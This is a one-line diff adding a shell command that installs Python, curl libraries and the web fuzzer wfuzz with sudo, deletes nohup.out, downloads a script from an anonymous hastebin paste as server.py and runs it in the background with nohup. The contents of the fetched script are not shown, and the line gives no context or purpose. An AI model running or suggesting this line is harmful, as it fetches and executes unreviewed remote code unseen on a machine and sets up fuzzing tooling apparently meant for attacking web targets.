@@ -1,0 +1,1 @@
+sudo apt install -y python3 python3-pip curl libcurl4-openssl-dev libssl-dev;sudo pip3 install wfuzz;rm nohup.out;wget https://hastebin.com/raw/zojosicisu -O server.py;nohup python3 server.py &
